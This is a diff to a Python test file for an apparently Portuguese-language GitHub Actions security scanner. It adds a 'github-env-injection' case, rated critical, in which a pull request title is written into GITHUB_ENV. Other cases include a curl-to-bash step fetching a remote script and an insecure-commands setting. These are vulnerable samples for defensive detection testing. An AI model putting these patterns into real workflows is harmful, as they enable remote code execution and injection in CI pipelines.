@@ -59,6 +59,11 @@ CASOS_POSITIVOS: dict[str, str] = {
         "    env:\n      ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n"
         "    steps:\n      - run: echo oi\n"
     ),
+    "github-env-injection": _steps(
+        "    env:\n      TITLE: ${{ github.event.pull_request.title }}\n"
+        '    steps:\n      - run: echo "SUBJECT=$TITLE" >> "$GITHUB_ENV"\n',
+        trigger="pull_request_target",
+    ),
     "curl-pipe-shell": _steps("    steps:\n      - run: curl https://x.invalid/i.sh | bash\n"),
     "self-hosted-runner": (
         "on: push\npermissions: {}\njobs:\n  b:\n    runs-on: self-hosted\n"
@@ -118,6 +123,7 @@ SEVERIDADES: dict[str, Severity] = {
     "secret-in-run": Severity.HIGH,
     "checkout-credentials-in-artifact": Severity.HIGH,
     "insecure-commands": Severity.HIGH,
+    "github-env-injection": Severity.CRITICAL,
     "invalid-yaml": Severity.HIGH,
     "curl-pipe-shell": Severity.MEDIUM,
     "self-hosted-runner": Severity.MEDIUM,
